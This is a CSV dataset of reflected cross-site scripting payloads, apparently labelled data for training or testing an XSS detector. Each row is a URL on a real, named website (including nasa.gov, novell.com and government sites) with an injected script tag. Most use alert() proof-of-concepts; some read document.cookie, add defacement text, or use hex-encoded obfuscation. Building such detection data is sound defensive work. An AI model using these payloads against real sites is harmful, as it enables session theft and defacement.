Payloads,Class,decoded,executed,parser_changed
http://www.zdob-si-zdub.com/news.phtml?vers=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.zdob-si-zdub.com/news.phtml?vers=""><script>alert(""maxwel"")</script>",True,True
http://www.novell.com/news/press/item.jsp?id=&lt;script&gt;alert(&quot;xroot owned you!&quot;)&lt;/script&gt;,Malicious,"http://www.novell.com/news/press/item.jsp?id=<script>alert(""xroot owned you!"")</script>",True,True
http://www.multi23usa.com/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%<br>3e,Malicious,"http://www.multi23usa.com/newsdetail.php?id='""></title><script>alert(1)</script>",True,True
http://astrogravs.nasa.gov/%7d%22%3e%3cscript%3ealert(%22test%22)%3c/script%3e,Malicious,"http://astrogravs.nasa.gov/}""><script>alert(""test"")</script>",True,True
http://www.lg.co.kr/kosearch/lg_en/total_list.jsp?entrynm=total&amp;kwd=%22%3e%3cscript%3ealert(%22stuar<br>ty%22)%3c/script%3e&amp;select=select+region&amp;input.x=14&amp;input.y=9,Malicious,"http://www.lg.co.kr/kosearch/lg_en/total_list.jsp?entrynm=total&kwd=""><script>alert(""stuarty"")</script>&select=select region&input.x=14&input.y=9",True,True
http://book.26cc.com/27cc/j.php?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://book.26cc.com/27cc/j.php?a=""><script>alert(""maxwel"")</script>",True,True
http://www.finance.gov.tt/help.php?mid=49&amp;q=%22%3e%3cscript%3ealert(%22airroxssed%22)%3b%3c%2fscript<br>%3e&amp;submit=search,Malicious,"http://www.finance.gov.tt/help.php?mid=49&q=""><script>alert(""airroxssed"");</script>&submit=search",True,True
http://www.thaisweetlove.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.thaisweetlove.com/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://webdirectory.natlib.govt.nz/cgi-bin/search?collection=all&amp;search=%22%3e%3cscript%3ealert%2812<br>3%29%3c%2fscript%3e%22&amp;display=10,Malicious,"http://webdirectory.natlib.govt.nz/cgi-bin/search?collection=all&search=""><script>alert(123)</script>""&display=10",True,True
http://www.satinrosedesigns.com/paradis/gallery/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious,"http://www.satinrosedesigns.com/paradis/gallery/index.php?c=""><script>alert(document.cookie)</script>",True,True
http://www.stellenanzeigen.de/stellenangebote/list_main.asp?plz=%3cscript%3ealert(%22xss%22)%3c/scri<br>pt%3e&amp;radius=60&amp;topjobs=false&amp;track=1&amp;volltitel=0,Malicious,"http://www.stellenanzeigen.de/stellenangebote/list_main.asp?plz=<script>alert(""xss"")</script>&radius=60&topjobs=false&track=1&volltitel=0",True,True
http://fr.netlog.com/foot4eva/photo/photoid=12146782&amp;order=%22%3cscript%3ealert('airroxssed');%3c/sc<br>ript%3e,Malicious,"http://fr.netlog.com/foot4eva/photo/photoid=12146782&order=""<script>alert('airroxssed');</script>",True,True
http://dendrome.ucdavis.edu/search.php?query=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://dendrome.ucdavis.edu/search.php?query=""><script>alert(""maxwel"")</script>",True,True
http://www.barcelona-bangers.co.uk/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.barcelona-bangers.co.uk/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://fry.webtart.co.uk/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://fry.webtart.co.uk/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://cinestar.de/de/kino/berlin-imax-3d-im-sony-center/filme/?tpl=131&amp;filmid=454241&amp;prefix=&quot;&gt;&lt;scri<br>pt&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://cinestar.de/de/kino/berlin-imax-3d-im-sony-center/filme/?tpl=131&filmid=454241&prefix=""><script>alert(document.cookie)</script>",True,True
http://www.snsi-j.jp/boyakif/diary.cgi?start=1&amp;pass=%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious,"http://www.snsi-j.jp/boyakif/diary.cgi?start=1&pass="">'><script>alert('xss')</script>",True,True
http://www.e-kent.com/content/news/news.asp?cat_name=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%20by<br>%20trex&lt;/h1&gt;,Malicious,"http://www.e-kent.com/content/news/news.asp?cat_name=""><script>alert('trex')</script><h1>hacked by trex</h1>",True,True
http://www.lovegodsway.org/%3cscript%3ealert('i-landet')%3c/script%3e,Malicious,http://www.lovegodsway.org/<script>alert('i-landet')</script>,True,True
http://www.techsmith.de/search.asp?cx=003285746377929346975%3auzef3wufigg&amp;lr=lang_de&amp;cof=forid%3a11&amp;<br>q=%3c%22%3c%3cscript%3ealert(document.cookie)%3c%2fscript%3e%3c%22%3c%3cscript%3ealert(document.cook<br>ie)%3c%2fscript%3e&amp;sa.x=24&amp;sa.y=13&amp;sa=search#281,Malicious,"http://www.techsmith.de/search.asp?cx=003285746377929346975:uzef3wufigg&lr=lang_de&cof=forid:11&q=<""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script>&sa.x=24&sa.y=13&sa=search#281",True,True
http://mail.gawab.com/trywebmail3.html?username='%3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;<br>domain='%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,http://mail.gawab.com/trywebmail3.html?username='><script>alert(document.cookie)</script>&domain='><script>alert(document.cookie)</script>,True,True
http://www.g-l.co.uk/alert.asp?catid=388&amp;msg=&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,http://www.g-l.co.uk/alert.asp?catid=388&msg=<script>alert(123)</script>,True,True
http://software.canon-europe.com/software/0027230.asp?model=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://software.canon-europe.com/software/0027230.asp?model=""><script>alert(123)</script>",True,True
http://ng.pic.to/notice.php?host=j&amp;page=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74<br>%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%<br>69%70%74%3e%0a&amp;code=,Malicious,"http://ng.pic.to/notice.php?host=j&page="">'><script>alert(String.fromCharCode(88,83,83))</script>
&code=",True,True
http://www.denizkiziyalikavak.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;,Malicious,"http://www.denizkiziyalikavak.com/scripts/kayit.asp?id=3558&dil=tr&page=grup.asp&results=""><script>alert(document.cookie)</script>",True,True
